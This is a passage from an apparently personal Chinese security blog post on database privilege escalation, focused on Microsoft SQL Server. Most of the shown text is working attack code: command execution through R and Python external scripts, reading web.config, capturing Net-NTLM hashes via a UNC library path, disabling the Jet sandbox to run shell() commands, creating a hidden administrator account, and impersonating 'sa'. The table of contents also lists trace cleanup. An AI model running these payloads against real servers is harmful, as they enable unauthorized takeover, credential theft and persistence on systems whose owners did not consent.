<span class="hljs-operator">@</span>script<span class="hljs-operator">=</span>N<span class="hljs-string">'OutputDataSet &lt;- data.frame(system("cmd.exe /c dir",intern=T))'</span>
WITH RESULT SETS <span class="hljs-punctuation">(</span><span class="hljs-punctuation">(</span><span class="hljs-punctuation">[</span>cmd_out<span class="hljs-punctuation">]</span> text<span class="hljs-punctuation">)</span><span class="hljs-punctuation">)</span>;
GO

<span class="hljs-operator">-</span><span class="hljs-operator">-</span> 利用 R 抓取 Net<span class="hljs-operator">-</span>NTLM 哈希
<span class="hljs-operator">@</span>script<span class="hljs-operator">=</span>N<span class="hljs-string">'.libPaths("\\\\testhost\\foo\\bar");library("0mgh4x")'</span></code></pre>
<p><strong>Python 脚本利用</strong></p>
<pre><code class="hljs python">-- 查看版本
<span class="hljs-built_in">exec</span> sp_execute_external_script
<span class="hljs-meta">@language =N<span class="hljs-string">'Python'</span>,</span>
<span class="hljs-meta">@script=N<span class="hljs-string">'import sys</span></span>
<span class="hljs-string"><span class="hljs-meta">OutputDataSet = pandas.DataFrame([sys.version])'</span></span>
WITH RESULT SETS ((python_version nvarchar(<span class="hljs-built_in">max</span>)))

-- 利用 Python 执行命令
<span class="hljs-built_in">exec</span> sp_execute_external_script
<span class="hljs-meta">@language =N<span class="hljs-string">'Python'</span>,</span>
<span class="hljs-meta">@script=N<span class="hljs-string">'import subprocess</span></span>
<span class="hljs-string"><span class="hljs-meta">p = subprocess.Popen("cmd.exe /c whoami", stdout=subprocess.PIPE)</span></span>
<span class="hljs-string"><span class="hljs-meta">OutputDataSet = pandas.DataFrame([str(p.stdout.read(), "utf-8")])'</span></span>

-- 利用 Python 读文件
EXECUTE sp_execute_external_script @language = N<span class="hljs-string">'Python'</span>, @script = N<span class="hljs-string">'print(open("C:\\inetpub\\wwwroot\\web.config", "r").read())'</span>
WITH RESULT SETS (([cmd_out] nvarchar(<span class="hljs-built_in">max</span>)))</code></pre>
<h2 id="沙盒提权">沙盒提权</h2>
<p>AD Hoc 分布式查询允许从多个异构数据源（例如 SQL Server 的多个实例）访问数据。这些数据源可以存储在相同或不同的计算机上。启用临时访问后，登录到该实例的任何用户都可以使用 OLE DB 提供程序通过 OPENROWSET 或 OPENDATASOURCE 函数执行引用网络上任何数据源的 SQL 语句。</p>
<p>攻击者滥用 Ad Hoc 分布式查询和 Microsoft OLE DB Provider for Microsoft Jet 来创建和执行旨在从远程服务器下载恶意可执行文件的脚本。</p>
<p>利用条件</p>
<ul>
<li>拥有 DBA 权限</li>
<li>sqlserver 服务权限为 system</li>
<li>服务器拥有 jet.oledb.4.0 驱动</li>
</ul>
<h3 id="方法一">方法一</h3>
<pre><code class="hljs sql"><span class="hljs-comment">-- 修改注册表，关闭沙盒模式</span>
<span class="hljs-keyword">EXEC</span> master.dbo.xp_regwrite <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SoftWare\Microsoft\Jet\4.0\Engines'</span>,<span class="hljs-string">'SandBoxMode'</span>,<span class="hljs-string">'REG_DWORD'</span>,<span class="hljs-number">0</span>

<span class="hljs-comment">-- 开启 Ad Hoc Distributed Queries</span>
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'show advanced options'</span>, <span class="hljs-number">1</span>
RECONFIGURE
GO
<span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">'ad hoc distributed queries'</span>, <span class="hljs-number">1</span>
RECONFIGURE
GO
<span class="hljs-comment">-- Until SQL Server 2012</span>

<span class="hljs-keyword">EXEC</span> sp_MSset_oledb_prop N<span class="hljs-string">'Microsoft.ACE.OLEDB.12.0'</span>, N<span class="hljs-string">'AllowInProcess'</span>, <span class="hljs-number">1</span>
<span class="hljs-keyword">EXEC</span> master.dbo.sp_MSset_oledb_prop N<span class="hljs-string">'Microsoft.Jet.OLEDB.4.0'</span>, N<span class="hljs-string">'AllowInProcess'</span>, <span class="hljs-number">1</span>

<span class="hljs-comment">-- SQL Server 2014 or later</span>
<span class="hljs-keyword">EXEC</span> sp_MSset_oledb_prop N<span class="hljs-string">'Microsoft.ACE.OLEDB.12.0'</span>, N<span class="hljs-string">'DynamicParameters'</span>, <span class="hljs-number">1</span>
<span class="hljs-keyword">EXEC</span> master.dbo.sp_MSset_oledb_prop N<span class="hljs-string">'Microsoft.Jet.OLEDB.4.0'</span>, N<span class="hljs-string">'DynamicParameters'</span>, <span class="hljs-number">1</span>

<span class="hljs-comment">-- Windows 2003 系统 c:\windows\system32\ias\ 目录下默认自带了 2 个 Access 数据库文件 ias.mdb/dnary.mdb, 所以直接调用即可.</span>
<span class="hljs-comment">-- Windows 2008 R2 默认无 Access 数据库文件, 需要自己上传, 或者用 UNC 路径加载文件方能执行命令.</span>
<span class="hljs-comment">-- SQL Server2008 默认未注册 microsoft.jet.oledb.4.0 接口, 所以无法利用沙盒模式执行系统命令.</span>

<span class="hljs-keyword">Select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">From</span> OpenRowSet(<span class="hljs-string">'microsoft.jet.oledb.4.0'</span>,<span class="hljs-string">';Database=c:\windows\system32\ias\ias.mdb'</span>,
<span class="hljs-string">'select shell("whoami")'</span>);

<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">'microsoft.jet.oledb.4.0'</span>,<span class="hljs-string">';database=\\192.168.1.8\file\ias.mdb'</span>,<span class="hljs-string">'select shell("c:\windows\system32\cmd.exe /c net user &gt;c:\test.txt ")'</span>);</code></pre>
<h2 id="方法二">方法二</h2>
<p>使用场景：无法执行命令时，<code>xp_regwrite</code>&nbsp;可用(使用条件)</p>
<ul>
<li>开启沙盒模式：</li>
</ul>
<pre><code class="hljs sql"><span class="hljs-keyword">exec</span> master..xp_regwrite <span class="hljs-string">'HKEY_LOCAL_MACHINE'</span>,<span class="hljs-string">'SOFTWARE\Microsoft\Jet\4.0\Engines'</span>,<span class="hljs-string">'SandBoxMode'</span>,<span class="hljs-string">'REG_DWORD'</span>,<span class="hljs-number">1</span></code></pre>
<p>SandBoxMode参数含义（默认是2）</p>
<p><code>0</code>：在任何所有者中禁止启用安全模式</p>
<p><code>1</code>&nbsp;：为仅在允许范围内</p>
<p><code>2</code>&nbsp;：必须在access模式下</p>
<p><code>3</code>：完全开启</p>
<ul>
<li>利用 jet.oledb 执行系统命令添加用户</li>
</ul>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">'microsoft.jet.oledb.4.0'</span> ,<span class="hljs-string">';database=c:\windows\system32\ias\ias.mdb'</span> ,<span class="hljs-string">'select shell("cmd.exe /c net user q 123456q /add")'</span>)</code></pre>
<ul>
<li>将 q 用户添加至管理员组</li>
</ul>
<pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> openrowset(<span class="hljs-string">'microsoft.jet.oledb.4.0'</span> ,<span class="hljs-string">';database=c:\windows\system32\ias\ias.mdb'</span> ,<span class="hljs-string">'select shell("cmd.exe /c net localgroup administrators q /add")'</span>)</code></pre>
<h2 id="mssql-模拟登录提权">Mssql 模拟登录提权</h2>
<p>开发者有时为了满足某种需求，允许其他登录用户模拟高权限的用户，对于开发来说，一个再简单不过的功能。虽然严格意义上这不算个漏洞，但是这种配置不当一般可以用来提权。</p>
<h3 id="提权过程">提权过程</h3>
<p><strong>赋予用户 MyUser1 权限来模拟 MyUser2, MyUser3,及sa</strong></p>
<pre><code class="hljs sql">USE master;
<span class="hljs-keyword">GRANT</span> IMPERSONATE <span class="hljs-keyword">ON</span> LOGIN::sa <span class="hljs-keyword">to</span> [MyUser1];
<span class="hljs-keyword">GRANT</span> IMPERSONATE <span class="hljs-keyword">ON</span> LOGIN::MyUser2 <span class="hljs-keyword">to</span> [MyUser1];
<span class="hljs-keyword">GRANT</span> IMPERSONATE <span class="hljs-keyword">ON</span> LOGIN::MyUser3 <span class="hljs-keyword">to</span> [MyUser1];
GO</code></pre>
<p><strong>查找可以模拟登录的用户</strong></p>
<p>默认情况下，系统管理员可以模拟任何人，但是正常登录必须分配权限来模拟特定的用户，使用 MyUser1 用户登录，打开新建查询，执行下面语句查询那些用户可以用来模拟登录</p>
<pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">distinct</span> b.name
<span class="hljs-keyword">FROM</span> sys.server_permissions a
<span class="hljs-keyword">INNER</span> <span class="hljs-keyword">JOIN</span> sys.server_principals b
<span class="hljs-keyword">ON</span> a.grantor_principal_id <span class="hljs-operator">=</span> b.principal_id
<span class="hljs-keyword">WHERE</span> a.permission_name <span class="hljs-operator">=</span> <span class="hljs-string">'IMPERSONATE'</span></code></pre>
<p>这里我们可以看到 MyUser1 用户可以模拟登录 sa, MyUser2, MyUser2 用户，接下来就是模拟登录 sa 来获取 sysadmin 权限了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806214138.png" alt></p>
<p><strong>模拟 SQL Server 用户登陆</strong></p>
<pre><code class="hljs sql"><span class="hljs-comment">-- 验证是否为sysadmin权限</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SYSTEM_USER</span>
<span class="hljs-keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="hljs-string">'sysadmin'</span>)
<span class="hljs-comment">-- 模拟sa登录</span>
<span class="hljs-keyword">EXECUTE</span> <span class="hljs-keyword">AS</span> LOGIN <span class="hljs-operator">=</span> <span class="hljs-string">'sa'</span>
<span class="hljs-comment">-- 验证是否为sysadmin权限</span>
<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">SYSTEM_USER</span>
<span class="hljs-keyword">SELECT</span> IS_SRVROLEMEMBER(<span class="hljs-string">'sysadmin'</span>)</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="../SecImages/Pasted%20image%2020240806214211.png" alt></p>
<p>当然这个也可以用 powershell 一键实现：<a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/nullbind/Powershellery/master/Stable-ish/MSSQL/Invoke-SqlServer-Escalate-ExecuteAs.psm1">脚本地址</a></p>
<h1 id="0x07-powerupsql-mssql-利用工具使用">0x07 PowerUpSQL MSSQL 利用工具使用</h1>
<p>参考文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10955?time__1311=CqjxRQiQitDtdGNDQ0n07FG8mk%2BK7K63x#toc-22">从0开始学习Microsoft SQL Server数据库攻防</a></p>
<h1 id="0x08-参考文章">0x08 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/database/291175.html">【数据库提权系列】—【Mysql-UDF提权篇】</a><br>
<a target="_blank" rel="noopener" href="https://www.cnblogs.com/pandana/p/16245486.html">[mysql udf提权 ]</a>  --webshell+udf提权可以看这篇<br>
<a target="_blank" rel="noopener" href="https://www.sqlsec.com/2020/11/mysql.html">MySQL 漏洞利用与提权</a><br>
<a target="_blank" rel="noopener" href="https://tttang.com/archive/1545/#toc_0x00">mssql 提权总结</a><br>
<a target="_blank" rel="noopener" href="https://www.geekby.site/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/#1-sql-server-%E7%9B%B8%E5%85%B3%E5%9F%BA%E7%A1%80%E7%AE%80%E4%BB%8B">MSSQL 注入与提权方法整理</a></p>
</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">hybcx</div><div class="post-copyright__author_desc">只需热爱, 未来可期！</div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/')">权限提升学习</span></a></div><div class="post-tools" id="post-tools"><div class="post-tools-left"><div class="rewardLeftButton"></div><div class="shareRight"><div class="share-link mobile"><div class="share-qrcode"><div class="share-button" title="使用手机访问这篇文章"><i class="anzhiyufont anzhiyu-icon-qrcode"></i></div><div class="share-main"><div class="share-main-all"><div id="qrcode" title="http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/"></div><div class="reward-dec">使用手机访问这篇文章</div></div></div></div></div><div class="share-link weibo"><a class="share-button" target="_blank" href="https://service.weibo.com/share/share.php?title=权限提升学习&amp;url=http://hybcx.xyz/2023/09/25/windows-ti-quan-xue-xi-er/&amp;pic=" rel="external nofollow noreferrer noopener"><i class="anzhiyufont anzhiyu-icon-weibo"></i></a></div><script>function copyCurrentPageUrl() {
  var currentPageUrl = window.location.href;
  var input = document.createElement("input");
  input.setAttribute("value", currentPageUrl);
  document.body.appendChild(input);
  input.select();
  input.setSelectionRange(0, 99999);
  document.execCommand("copy");
  document.body.removeChild(input);
}</script><div class="share-link copyurl"><div class="share-button" id="post-share-url" title="复制链接" onclick="copyCurrentPageUrl()"><i class="anzhiyufont anzhiyu-icon-link"></i></div></div></div></div></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://hybcx.xyz" target="_blank">hybcx</a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/Windows%E6%8F%90%E6%9D%83/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>Windows提权<span class="tagsPageCount">2</span></a></div></div></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"/><script src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer="defer"></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/24/kioptrix-level-1.3/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">vulnhub-kioptrix_level 1.3</div></div></a></div><div class="next-post pull-right"><a href="/2023/10/01/ti-mu-ming-cheng-ssrf-me/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">题目名称-SSRF Me</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/08/05/windows-ti-quan-zong-jie/" title="Windows提权总结"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-08-05</div><div class="title">Windows提权总结</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="anzhiyufont anzhiyu-icon-comments"></i><span> 评论</span></div><div class="comment-randomInfo"><a onclick="anzhiyu.addRandomCommentInfo()" href="javascript:void(0)">匿名评论</a><a href="/privacy" style="margin-left: 4px">隐私政策</a></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div><div class="comment-barrage"></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-content"><div class="author-info__sayhi" id="author-info__sayhi" onclick="anzhiyu.changeSayHelloText()"></div><div class="author-info-avatar"><img class="avatar-img" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408162252382.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-status"><img class="g-status" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2023/08/24/64e6ce9c507bb.png" alt="status"/></div></div><div class="author-info__description"><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">这有关于<b style="color:#fff">产品、设计、开发</b>相关的问题和看法，还有<b style="color:#fff">文章翻译</b>和<b style="color:#fff">分享</b>。</div><div style="line-height:1.38;margin:0.6rem 0;text-align:justify;color:rgba(255, 255, 255, 0.8);">相信你可以在这里找到对你有用的<b style="color:#fff">知识</b>和<b style="color:#fff">教程</b>。</div></div><div class="author-info__bottom-group"><a class="author-info__bottom-group-left" href="/about"><h1 class="author-info__name">hybcx</h1><div class="author-info__desc">只需热爱, 未来可期！</div></a><div class="card-info-social-icons is-center"><a class="social-icon faa-parent animated-hover" href="https://github.com/hybchenxing" target="_blank" title="Github"><i class="anzhiyufont anzhiyu-icon-github"></i></a><a class="social-icon faa-parent animated-hover" href="https://space.bilibili.com/1761635300" target="_blank" title="Email"><i class="anzhiyufont anzhiyu-icon-bilibili"></i></a></div></div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-mysql-udf-%E6%8F%90%E6%9D%83"><span class="toc-number">2.</span> <span class="toc-text">0x02 MySQL-udf 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#21-%E7%AE%80%E4%BB%8B"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#22-%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 利用条件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#221-%E5%B8%B8%E8%A7%84%E6%83%85%E5%86%B5"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1 常规情况：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#222-%E7%89%B9%E6%AE%8A%E6%83%85%E5%86%B5"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2 特殊情况：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">查看当前数据库用户权限：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#23-%E7%89%88%E6%9C%AC%E7%89%B9%E6%80%A7"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 版本特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-mysql-lt-41"><span class="toc-number">2.3.1.</span> <span class="toc-text">1、 Mysql &lt; 4.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-mysql-lt-50"><span class="toc-number">2.3.2.</span> <span class="toc-text">2、 Mysql &lt; 5.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-50-lt-mysql-lt-51"><span class="toc-number">2.3.3.</span> <span class="toc-text">3、 5.0 &lt;&#x3D; Mysql &lt; 5.1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-mysql-gt-51"><span class="toc-number">2.3.4.</span> <span class="toc-text">4、 Mysql &gt;&#x3D; 5.1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#24-udf%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 UDF文件位置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-sqlmap"><span class="toc-number">2.4.1.</span> <span class="toc-text">1、sqlmap：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-metaspliot"><span class="toc-number">2.4.2.</span> <span class="toc-text">2、metaspliot：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#25-%E6%93%8D%E4%BD%9C%E6%AD%A5%E9%AA%A4"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 操作步骤</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%9F%A5%E7%9C%8B%E5%8F%AF%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.5.1.</span> <span class="toc-text">1、查看可导出文件位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%9F%A5%E7%9C%8B%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90"><span class="toc-number">2.5.2.</span> <span class="toc-text">2、查看当前数据库用户权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E7%A1%AE%E8%AE%A4mysql%E5%AE%89%E8%A3%85%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.5.3.</span> <span class="toc-text">3、确认mysql安装位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E9%80%9A%E8%BF%87%E4%B8%BB%E6%9C%BA%E7%89%88%E6%9C%AC%E5%8F%8A%E6%9E%B6%E6%9E%84%E7%A1%AE%E8%AE%A4mysql%E4%BD%8D%E6%95%B0%E6%9D%A5%E9%80%89%E7%94%A8udf%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.4.</span> <span class="toc-text">4、通过主机版本及架构确认mysql位数来选用udf文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%9F%A5%E7%9C%8B%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%88%E6%9C%AC%E5%88%A4%E6%96%ADudf%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E4%BD%8D%E7%BD%AE"><span class="toc-number">2.5.5.</span> <span class="toc-text">5、查看数据库版本，判断udf文件写入位置</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#51-mysql%E5%A4%A7%E4%BA%8E51%E7%89%88%E6%9C%AC%E6%97%B6"><span class="toc-number">2.5.5.1.</span> <span class="toc-text">5.1 mysql大于5.1版本时</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#512-sqlmap-udf%E6%96%87%E4%BB%B6%E8%A7%A3%E7%A0%81"><span class="toc-number">2.5.5.1.1.</span> <span class="toc-text">5.1.2 sqlmap udf文件解码</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#513-16%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81udf%E6%96%87%E4%BB%B6"><span class="toc-number">2.5.5.1.2.</span> <span class="toc-text">5.1.3 16进制编码udf文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#514-udf%E5%86%99%E5%85%A5plugin%E7%9B%AE%E5%BD%95"><span class="toc-number">2.5.5.1.3.</span> <span class="toc-text">5.1.4 udf写入plugin目录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#515-%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%A1%A8%E5%B9%B6%E5%B0%86%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%95%B0%E6%8D%AE%E6%8F%92%E5%85%A5%E5%88%B0%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BC%96%E7%A0%81%E6%B5%81"><span class="toc-number">2.5.5.1.4.</span> <span class="toc-text">5.1.5 创建一个表并将二进制数据插入到十六进制编码流</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#516-%E9%9A%8F%E4%BE%BF%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8E%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%A1%A8"><span class="toc-number">2.5.5.1.5.</span> <span class="toc-text">5.1.6 随便选择一个数据库后，创建一个表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#517-insert%E6%8F%92%E5%85%A5%E7%AC%AC%E4%B8%80%E6%AE%B5%E6%95%B0%E6%8D%AE"><span class="toc-number">2.5.5.1.6.</span> <span class="toc-text">5.1.7 insert插入第一段数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#518-update%E6%8B%BC%E6%8E%A5%E5%89%A9%E4%BD%99%E6%95%B0%E6%8D%AE"><span class="toc-number">2.5.5.1.7.</span> <span class="toc-text">5.1.8 update拼接剩余数据</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#519-%E5%AF%BC%E5%87%BA%E8%A1%A8%E4%B8%AD%E6%95%B0%E6%8D%AE%E5%88%B0%E7%B3%BB%E7%BB%9F%E7%A3%81%E7%9B%98"><span class="toc-number">2.5.5.1.8.</span> <span class="toc-text">5.1.9 导出表中数据到系统磁盘</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#52-mysql%E5%B0%8F%E4%BA%8E51%E7%89%88%E6%9C%AC%E6%97%B6"><span class="toc-number">2.5.5.2.</span> <span class="toc-text">5.2 mysql小于5.1版本时：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E5%88%9B%E5%BB%BA%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0"><span class="toc-number">2.5.6.</span> <span class="toc-text">6、创建命令执行函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.5.7.</span> <span class="toc-text">7、命令执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#26-%E7%97%95%E8%BF%B9%E6%B8%85%E9%99%A4"><span class="toc-number">2.6.</span> <span class="toc-text">2.6 痕迹清除</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#261-%E5%88%A0%E9%99%A4%E8%A1%A8"><span class="toc-number">2.6.1.</span> <span class="toc-text">2.6.1 删除表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#262-%E5%88%A0%E9%99%A4%E5%87%BD%E6%95%B0"><span class="toc-number">2.6.2.</span> <span class="toc-text">2.6.2 删除函数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#27-%E5%85%B6%E4%BB%96%E9%97%AE%E9%A2%98"><span class="toc-number">2.7.</span> <span class="toc-text">2.7 其他问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-error-1125-hy000"><span class="toc-number">2.7.1.</span> <span class="toc-text">1、ERROR 1125 (HY000)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%8F%90%E7%A4%BAsys_eval-%E5%87%BD%E6%95%B0%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E4%BD%86%E6%97%A0%E6%B3%95%E5%88%A9%E7%94%A8"><span class="toc-number">2.7.2.</span> <span class="toc-text">2、提示sys_eval 函数已经存在，但无法利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 